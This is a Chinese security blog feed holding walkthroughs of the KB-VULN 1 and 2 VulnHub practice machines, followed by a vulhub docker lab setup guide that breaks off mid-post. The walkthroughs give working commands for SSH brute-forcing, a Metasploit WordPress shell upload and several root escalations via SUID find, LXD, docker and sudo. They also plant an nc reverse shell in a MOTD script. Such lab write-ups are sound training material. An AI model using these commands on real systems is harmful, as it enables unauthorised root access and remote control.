      <title>KB-VULN：1靶机练习</title>
      <link href="2023/11/28/KB-VULN1%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>2023/11/28/KB-VULN1%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="VirtualBox环境搭建"><a href="#VirtualBox环境搭建" class="headerlink" title="VirtualBox环境搭建"></a>VirtualBox环境搭建</h3><p>下载地址：<a href="http://www.vulnhub.com/entry/kb-vuln-1,540/">http://www.vulnhub.com/entry/kb-vuln-1,540/</a></p><p>靶机有两个flag：user.txt和flag.txt</p><p>接下来就是寻找它的过程</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201228101032156.png"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201229094510945.png" alt="image-20201229094510945"></p><h3 id="获取虚拟机的ip地址"><a href="#获取虚拟机的ip地址" class="headerlink" title="获取虚拟机的ip地址"></a>获取虚拟机的ip地址</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover </span><br></pre></td></tr></table></figure><p>或者用nmap的主机存活扫描获取虚拟机ip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.0.0&#x2F;16</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201229094612346.png" alt="image-20201229094612346"> </p><p>kali下运行netdiscover总是找不到，可能我kali是桥接模式，靶机是host-only模式</p><p>当然也试过nat模式，也是不行的，总之找到了就好，开心。</p><blockquote><p>现在找到了方法，只需要将kali桥接到靶机host-only的网卡上，就可以实现通信，netdiscover十分迅速就能找到ip</p></blockquote><h3 id="端口检测"><a href="#端口检测" class="headerlink" title="端口检测"></a>端口检测</h3><p>发现只有21、22、80端口开放</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201229095300051.png" alt="image-20201229095300051"></p><p>打开网页查看</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201229095553984.png" alt="image-20201229095553984"></p><p>查看源码</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201229095621740.png" alt="image-20201229095621740"></p><h3 id="爆破密码"><a href="#爆破密码" class="headerlink" title="爆破密码"></a>爆破密码</h3><p>找到了用户名，爆破走一波</p><p>本想web登录抓包，但是登录处写了需要填写邮箱地址，显然不能用sysadmin登录，22端口开放，于是用ssh登录爆破</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201229102402387.png" alt="image-20201229102402387"></p><p>找到密码了，上</p><h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><p>找到一个flag</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201229102743606.png" alt="image-20201229102743606"></p><p>查看自己是不是最高权限，有几种方法</p><ul><li>cat /etc/shadow 有没有查看权限</li><li>sudo -v 不能执行就不是</li><li>查看id ，最高权限为0</li></ul><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201229103659347.png" alt="image-20201229103659347"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201229103710382.png" alt="image-20201229103710382"></p><p>显然，当前sysadmin是普通用户，且是属于很多组，其中就有lxd组，还有sudo组</p><h3 id="法一：利用find提权"><a href="#法一：利用find提权" class="headerlink" title="法一：利用find提权"></a>法一：利用find提权</h3><p>查找/目录下所有可读可写可执行的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -type f -perm -ug&#x3D;rwx 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><blockquote><p>-type  b/d/c/p/l/f     #查是块设备、目录、字符设备、管道、符号链接、普通文件</p><p>-perm  根据文件的权限来查找文件，有三种形式</p><ul><li><p>find -perm mode   完全匹配</p></li><li><p>find -perm -mode  有1的部分都必须被匹配</p></li><li><p>find -perm +mode  只需其中的任意一个1的部分被匹配</p></li></ul><p>2&gt;/dev/null  把错误输出到“黑洞”</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -ls &#x2F;etc&#x2F;update-motd.d&#x2F;00-header</span><br><span class="line">echo &quot;sudo chmod u+s &#x2F;usr&#x2F;bin&#x2F;find&quot; &gt;&gt; &#x2F;etc&#x2F;update-motd.d&#x2F;00-header</span><br></pre></td></tr></table></figure><blockquote><p>u+s 用户权限：</p><p>执行命令chmod u+s， 就是针对某个程序任何用户都有读写这个程序的权限，可以像root用户一样操作，这个指令只对程序有效，如果用此权限放在路径上是无效的。</p></blockquote><p>为/usr/bin/find 添加s特权之后，退出重连</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201229132307665.png" alt="image-20201229132307665"></p><p>这一步特别关键，查找到可读可写可执行的文件，利用这个文件以root身份添加find的权限为suid</p><p>但是如果一开始find就有suid的权限就不用了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201229135523802.png" alt="image-20201229135523802"></p><h4 id="获取root访问"><a href="#获取root访问" class="headerlink" title="获取root访问"></a>获取root访问</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -ls &#x2F;usr&#x2F;bin&#x2F;find</span><br><span class="line">find 1 -exec &#x2F;bin&#x2F;bash -p \; </span><br></pre></td></tr></table></figure><blockquote><p>-exec  参数后面跟的是command命令，它的终止是<strong>以;为结束标志的</strong>，所以这句命令后面的分号是不可缺少的，<strong>考虑到各个系统中分号会有不同的意义，所以前面加反斜杠</strong>。</p><p>1是针对1这个文件进行后续的命令执行操作</p><p>/bin/bash -p 是换一个bash环境吧（我猜的，有大佬知道的话欢迎评论告诉我</p></blockquote><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201229115722684.png" alt="image-20201229115722684"></p><p>这里的文件1是我touch的，不用创建也可以，直接<code>find . -exec /bin/bash -p \;</code> 就是root权限了</p><h3 id="法二：利用LXD实现权限提升"><a href="#法二：利用LXD实现权限提升" class="headerlink" title="法二：利用LXD实现权限提升"></a>法二：利用LXD实现权限提升</h3><p>为了将我们的用户账号提升为root权限，我们还需要为LXD创建一个镜像文件，操作步骤如下：</p><p>首先，攻击者需要在自己设备上进行如下操作：</p><blockquote><p>1、通过git将构建好的alpine镜像克隆至本地；</p><p>2、执行“build -alpine”命令完成最新版本的Alpine镜像构建，此操作必须由root用户完成；</p><p>3、将tar文件发送至目标设备；</p></blockquote><p>接下来，我们需要在目标设备上进行如下操作：</p><blockquote><p>1、下载Alpine镜像；</p><p>2、为LXD导入镜像；</p><p>3、在新的容器环境中初始化镜像；</p><p>4、在/root目录中加载容器；</p></blockquote><h4 id="kali下载镜像"><a href="#kali下载镜像" class="headerlink" title="kali下载镜像"></a>kali下载镜像</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone  https:&#x2F;&#x2F;github.com&#x2F;saghul&#x2F;lxd-alpine-builder.git</span><br><span class="line">cd lxd-alpine-builder</span><br><span class="line">.&#x2F;build-alpine</span><br></pre></td></tr></table></figure><p>然后将自动生成的压缩包文件传到靶机上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer   kali会自动变成一个8000端口的服务器,但是由于我的kali和靶机不通，我只能用sftp传过去了</span><br></pre></td></tr></table></figure><h4 id="靶机LXD搭建"><a href="#靶机LXD搭建" class="headerlink" title="靶机LXD搭建"></a>靶机LXD搭建</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd tmp (很重要的一步，不然搭建不成)</span><br><span class="line">wget http:&#x2F;&#x2F;192.168.1.107:8000&#x2F;alpine-v3.12-x86_64-20201229_1545.tar.gz（访问kali服务器的下载方式）</span><br></pre></td></tr></table></figure><p>镜像下载完成过后，就可以以镜像的形式添加进LXD了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lxc image import .&#x2F;alpine-v3.12-x86_64-20201229_1545.tar.gz --alias myimage</span><br><span class="line">lxc image list</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201229160803331.png" alt="image-20201229160803331"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lxc init myimage ignite -c security.privileged&#x3D;true</span><br><span class="line">lxc config device add ignite mydevice disk source&#x3D;&#x2F; path&#x3D;&#x2F;mnt&#x2F;root recursive&#x3D;true</span><br><span class="line">lxc start ignite</span><br><span class="line">lxc exec ignite &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>接下来只要安装上述步骤依次执行即可，但是我遇到了一个问题</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201229160939268.png" alt="image-20201229160939268"></p><p>百度之后，找到了解决方法，要先<code>lxd init</code></p><p>一通回车之后，再执行，嘿！好了，然后就能看到<code>~ #</code> 的标识</p><p>进入原先<code>/root</code>的方式变为了 <code>cd /mnt/root/root</code> 因为挂载在/mnt/root下了</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201229161245580.png" alt="image-20201229161245580"></p><h3 id="法三：MOTD反弹shell提权"><a href="#法三：MOTD反弹shell提权" class="headerlink" title="法三：MOTD反弹shell提权"></a>法三：MOTD反弹shell提权</h3><p>利用前面找到的可读可写可执行的<code>具有root权限</code>的/etc/update-motd.d/00-header文件</p><p><code>vi 00-header</code> 输入反弹shell的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.56.1 4444 &gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201230143540435.png" alt="image-20201230143540435"></p><p>这里面我用的是nc反弹，换一种反弹方式当然也可以，比如Python脚本啦等等，得到shell都就会自动获得root权限了，因为这个文件的权限大，所有才会有root权限，换一种普通用户的文件写入当然也是可以反弹shell了，但是权限还是文件所属 的用户权限哦，并没有提权的。</p><p>由于motd是用户登录系统触发的，因此我退出重新登录了一次，本机保持一致监听状态，发现果然成功了，并且已经是root权限了！又get一个新技能(￣▽￣)／</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201230143813118.png" alt="image-20201230143813118"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.hacknos.com/kb-vuln-1-vulnhub-walkthrough/">https://www.hacknos.com/kb-vuln-1-vulnhub-walkthrough/</a></p><p><a href="https://www.cnblogs.com/PANDA-Mosen/p/13229881.html">https://www.cnblogs.com/PANDA-Mosen/p/13229881.html</a></p><p><a href="https://www.cnblogs.com/xydd/p/13161689.html">https://www.cnblogs.com/xydd/p/13161689.html</a></p><p><a href="https://char61462.medium.com/vulnhubs-kb-vuln-1-ctf-walkthrough-ec807d65a2a4">https://char61462.medium.com/vulnhubs-kb-vuln-1-ctf-walkthrough-ec807d65a2a4</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> vulnhub </tag>
            
            <tag> 内网提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KB-VULN：2靶机练习</title>
      <link href="2023/11/28/KB-VULN2%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>2023/11/28/KB-VULN2%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="VirtualBox环境搭建"><a href="#VirtualBox环境搭建" class="headerlink" title="VirtualBox环境搭建"></a>VirtualBox环境搭建</h2><p>下载地址：<a href="https://www.vulnhub.com/entry/kb-vuln-2,562/">https://www.vulnhub.com/entry/kb-vuln-2,562/</a></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201230151238998.png" alt="image-20201230151238998"></p><p>扫描靶机ip，根据Mac地址确认</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201230163542807.png" alt="image-20201230163542807"></p><p><code>netdiscover</code></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201231102051096.png" alt="image-20201231102051096"></p><h2 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h2><p>开放的端口：21,22,80,137,139,445</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201230164017434.png" alt="image-20201230164017434"></p><p>80端口：</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201230164036975.png" alt="image-20201230164036975"></p><p>其他端口爆破尝试</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201230164301470.png" alt="image-20201230164301470"></p><p>好家伙，smb弱口令出来了，其实就是可以匿名访问,smb是共享文件的一个服务</p><h2 id="smb探测"><a href="#smb探测" class="headerlink" title="smb探测"></a>smb探测</h2><p>Windows下进入192.168.56.103的共享文件夹</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201230164842672.png" alt="image-20201230164842672"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201230164857255.png" alt="image-20201230164857255"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201230164906288.png" alt="image-20201230164906288"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201230164923706.png" alt="image-20201230164923706"></p><p>发现了admin密码<code>MachineBoy141</code></p><p>也就是说wp这个站点的用户名和密码已经知道了</p><h2 id="wp登陆"><a href="#wp登陆" class="headerlink" title="wp登陆"></a>wp登陆</h2><p>访问<a href="http://192.168.56.103/wordpress/">http://192.168.56.103/wordpress/</a> ，发现了一个登陆点</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201231091834123.png" alt="image-20201231091834123"></p><p>但是打开是<code>kb.vuln</code>域名下的，打不开，再一想，我直接用ip访问不行吗</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201231092016931.png" alt="image-20201231092016931"></p><p>输入刚刚获取到的用户名和密码，点击登陆，又自动跳到kb.vuln下了。。。</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201231092101440.png"></p><p>这咋整，只能添加域名映射了。</p><p>打开主机的<code>C:\Windows\System32\drivers\etc\hosts</code>文件，添加</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201231092320224.png" alt="image-20201231092320224"></p><p>然后再登陆进去</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201231092426649.png" alt="image-20201231092426649"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201231103114508.png" alt="image-20201231103114508"></p><h2 id="msf获取shell"><a href="#msf获取shell" class="headerlink" title="msf获取shell"></a>msf获取shell</h2><p>运行msfconsole并加载<code>wp_admin_shell_upload</code>利用，并设置targeturi和admin用户名和密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;unix&#x2F;webapp&#x2F;wp_admin_shell_upload</span><br><span class="line">set rhosts 192.168.56.103</span><br><span class="line">set targeturi &#x2F;wordpress</span><br><span class="line">set username admin</span><br><span class="line">set password MachineBoy141</span><br><span class="line">set lhost 192.168.56.104  (这一步必须有，默认的127.0.0.1是不行的)</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>获取session之后，<code>shell</code>出错 “sh: 0: getcwd() failed: No such file or directory”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201231104509455.png" alt="image-20201231104509455"></p><p>又是一个普通权限，提权</p><p>想着还用find方式来提权，查找有没有权限高的执行文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -type f -perm -ug&#x3D;rwx 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p>然后出现一堆PHP、HTML文件</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201231113823019.png" alt="image-20201231113823019"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">ls -l</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201231113920217.png" alt="image-20201231113920217"></p><p>还有一个readme,打开一看，它说<code>system administrator is kbadmin.</code></p><p>查看etc/passwd下也有这个用户，那就su试试，密码也没改，就进来了<img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201231114143463.png" alt="image-20201231114143463"></p><p>有lxd,docker,sudo权限，针不戳</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h3><h4 id="awk命令"><a href="#awk命令" class="headerlink" title="awk命令"></a>awk命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201231130341844.png" alt="image-20201231130341844"></p><h4 id="vim命令"><a href="#vim命令" class="headerlink" title="vim命令"></a>vim命令</h4><p>sudo vim 输入密码 MachineBoy141打开后 输入:!/bin/bash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vim</span><br><span class="line">:!&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201231130852449.png" alt="image-20201231130852449"></p><h4 id="修改root密码"><a href="#修改root密码" class="headerlink" title="修改root密码"></a>修改root密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure><p>直接重设密码，都不用知道原密码是什么</p><h3 id="docker提权"><a href="#docker提权" class="headerlink" title="docker提权"></a>docker提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br><span class="line">docker run -it -v &#x2F;:&#x2F;mnt ubuntu</span><br></pre></td></tr></table></figure><blockquote><ul><li>-it =&gt;交互模式</li><li>-v =&gt;详细模式</li><li>/ =&gt;目标安装目录</li><li>：mnt =&gt; docker安装点</li></ul></blockquote><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201231134019016.png" alt="image-20201231134019016"></p><p>这个拉取的过程需要能够访问公网，从公网下载需要一些时间，拉取完成就会自动变成root权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;mnt (挂载处)</span><br><span class="line">cd &#x2F;mnt&#x2F;root (真正的&#x2F;root位置)</span><br></pre></td></tr></table></figure><h3 id="lxd提权"><a href="#lxd提权" class="headerlink" title="lxd提权"></a>lxd提权</h3><p>攻击机处提前下载镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone  https:&#x2F;&#x2F;github.com&#x2F;saghul&#x2F;lxd-alpine-builder.git</span><br><span class="line">cd lxd-alpine-builder</span><br><span class="line">.&#x2F;build-alpine</span><br></pre></td></tr></table></figure><p>找到lxd镜像位置，开启共享，让靶机获取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure><p>默认8000端口</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201231140555060.png" alt="image-20201231140555060"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201231140132926.png" alt="image-20201231140132926"></p><p>靶机下获取过来tar</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp (十分重要，不然下载不成功)</span><br><span class="line">wget http:&#x2F;&#x2F;192.168.56.104:8000&#x2F;alpine-v3.12-x86_64-20201229_1545.tar.gz </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201231141713406.png" alt="image-20201231141713406"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lxd init 一路回车</span><br><span class="line">lxc image import .&#x2F;alpine-v3.12-x86_64-20201229_1545.tar.gz --alias myimage</span><br><span class="line">lxc image list</span><br><span class="line">lxc init myimage ignite -c security.privileged&#x3D;true</span><br><span class="line">lxc config device add ignite mydevice disk source&#x3D;&#x2F; path&#x3D;&#x2F;mnt&#x2F;root recursive&#x3D;true</span><br><span class="line">lxc start ignite</span><br><span class="line">lxc exec ignite &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201231141901930.png" alt="image-20201231141901930"></p><h2 id="ssh登录连接"><a href="#ssh登录连接" class="headerlink" title="ssh登录连接"></a>ssh登录连接</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;ssh&#x2F;sshd_config  确认PasswordAuthentication是yes</span><br><span class="line">echo &quot;PermitRootLogin yes&quot; &gt;&gt; &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">sudo service sshd restart </span><br></pre></td></tr></table></figure><p>添加允许root进行ssh登录权限，就可以用root登录了</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201231160410564.png" alt="image-20201231160410564"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.hacknos.com/kb-vuln2-vulnhub-walkthrough/">https://www.hacknos.com/kb-vuln2-vulnhub-walkthrough/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> vulnhub </tag>
            
            <tag> 内网提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali安装docker搭建vulhub靶场</title>
      <link href="2023/11/28/kali%E5%AE%89%E8%A3%85docker%E6%90%AD%E5%BB%BAvulhub%E9%9D%B6%E5%9C%BA/"/>
      <url>2023/11/28/kali%E5%AE%89%E8%A3%85docker%E6%90%AD%E5%BB%BAvulhub%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="kali安装docker"><a href="#kali安装docker" class="headerlink" title="kali安装docker"></a>kali安装docker</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get install docker.io</span><br><span class="line">docker version   # 检测安装是否成功</span><br></pre></td></tr></table></figure><h2 id="设为开机自启动"><a href="#设为开机自启动" class="headerlink" title="设为开机自启动"></a>设为开机自启动</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service docker start</span><br><span class="line">update-rc.d docker enable</span><br></pre></td></tr></table></figure><h2 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install docker-compose</span><br></pre></td></tr></table></figure><blockquote><p>Compose 是 Docker 容器进行编排的工具，定义和运行多容器的应用，可以一条命令启动多个容器，使用Docker Compose不再需要使用shell脚本来启动容器。</p></blockquote><h2 id="下载vulhub环境"><a href="#下载vulhub环境" class="headerlink" title="下载vulhub环境"></a>下载vulhub环境</h2><p><a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a> 直接下载后拖到kali中</p><p>或 git clone <a href="https://github.com/vulhub/vulhub.git">https://github.com/vulhub/vulhub.git</a></p><blockquote><p> Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。旨在让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。</p></blockquote><h2 id="使用vulhub靶场"><a href="#使用vulhub靶场" class="headerlink" title="使用vulhub靶场"></a>使用vulhub靶场</h2><p>进入vulhub目录，可以看到很多测试环境，每个环境目录下都有相应的说明文件</p><p>选择一个测试目录，比如想测试struts2-016漏洞，进入s2-016</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master</span><br><span class="line">cd strust2</span><br><span class="line">cd s2-016</span><br></pre></td></tr></table></figure><h2 id="编译靶场环境"><a href="#编译靶场环境" class="headerlink" title="编译靶场环境"></a>编译靶场环境</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br></pre></td></tr></table></figure><blockquote><p>等候全部pull complete和全部步骤的完成，可以卡住不动了，但是已经搭建完成了，需要再启动就行</p></blockquote><h2 id="启动整个环境"><a href="#启动整个环境" class="headerlink" title="启动整个环境"></a>启动整个环境</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210226131716885.png" alt="image-20210226131716885"></p><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>我们测试下访问web页面</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210226131810820.png" alt="image-20210226131810820"></p><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>工具检测strust2漏洞，url：<a href="http://192.168.116.128:8080/index.action">http://192.168.116.128:8080/index.action</a></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210226132044157.png" alt="image-20210226132044157"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210226131943231.png" alt="image-20210226131943231"></p><p>两款工具都显示有漏洞</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210226134842999.png" alt="image-20210226134842999"></p><p>路径是基本信息获取的</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210226134918700.png" alt="image-20210226134918700"></p><p>上传文件名随便填了一个1 然后点击上传</p><p>上传成功后访问 <a 